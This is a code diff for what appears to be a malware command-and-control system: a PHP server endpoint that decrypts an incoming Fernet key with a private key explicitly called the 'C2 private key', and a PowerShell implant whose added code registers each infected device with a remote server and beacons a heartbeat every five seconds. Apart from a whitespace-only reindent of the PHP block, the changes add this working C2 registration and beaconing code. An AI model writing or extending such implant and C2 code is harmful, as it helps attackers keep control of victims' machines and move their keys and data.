@@ -1,28 +1,28 @@
 <?php
-require_once("Fernet/Fernet.php"); 
+require_once("Fernet/Fernet.php");
 
 use Fernet\Fernet;
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $data = json_decode(file_get_contents('php://input'), true);
-    
-    if (isset($data['encrypted_key'])) {
-		$ca_key_passphrase = getenv('CA_KEY_PASSPHRASE');
-		if (!$ca_key_passphrase) {
-			error_log('CA key passphrase environment variable is not set.');
-		}
-        // Load the CA private key
-		$ca_private_key = file_get_contents("/var/www/keys/private_rsa.key");
-		if (!$ca_private_key) {
-			error_log('Failed to read CA private key.');
-		}
 
-		// Parse the CA private key
-		$RSA_privatekey = openssl_pkey_get_private($ca_private_key, $ca_key_passphrase);
-		if (!$RSA_privatekey) {
-			error_log('Failed to parse CA private key: ' . openssl_error_string());
-		}
-        
+    if (isset($data['encrypted_key'])) {
+                $ca_key_passphrase = getenv('CA_KEY_PASSPHRASE');
+                if (!$ca_key_passphrase) {
+                        error_log('CA key passphrase environment variable is not set.');
+                }
+        // Load the CA private key
+                $ca_private_key = file_get_contents("/var/www/keys/private_rsa.key");
+                if (!$ca_private_key) {
+                        error_log('Failed to read CA private key.');
+                }
+
+                // Parse the CA private key
+                $RSA_privatekey = openssl_pkey_get_private($ca_private_key, $ca_key_passphrase);
+                if (!$RSA_privatekey) {
+                        error_log('Failed to parse CA private key: ' . openssl_error_string());
+                }
+
         // Decrypt Fernet key with C2 private key
         $encrypted_fernet_key = base64_decode($data['encrypted_key']);
         $fernet_key = '';
@@ -54,7 +54,6 @@ $functions = {
     function Encode($data){
         return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
     }
-
     #---------------------------------------------------------------------------------------------------------------------
     #                                                     Heartbeat Functions
     #---------------------------------------------------------------------------------------------------------------------
@@ -62,9 +61,24 @@ $functions = {
     #It will be using the unique MAC address to differentiate the different devices
 
     function Send_HeartBeat{
+        # Check if UUID is already generated, if not, generate it
+        if (-not $uuid) {
+            Write-Host "Generating UUID"
+            $pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
+            $key_data = @{ PuK = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pub_key.ToString()))}
+            try {
+                $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
+                $uuid = ($response.Content | ConvertFrom-Json).uuid
+            } catch {
+                Write-Error "Failed to generate UUID: $_"
+                return
+            }
+        } else {}
         while(1){
             if (Is_Connected -ne $null){
                 $url = $heartbeat + 'uuid=' + $uuid
+                Write-Host "Url =" $url
+                Write-Host "uuid =" $uuid
                 Invoke-WebRequest -Uri $url -UseBasicParsing
                 Start-Sleep -s 5
             }
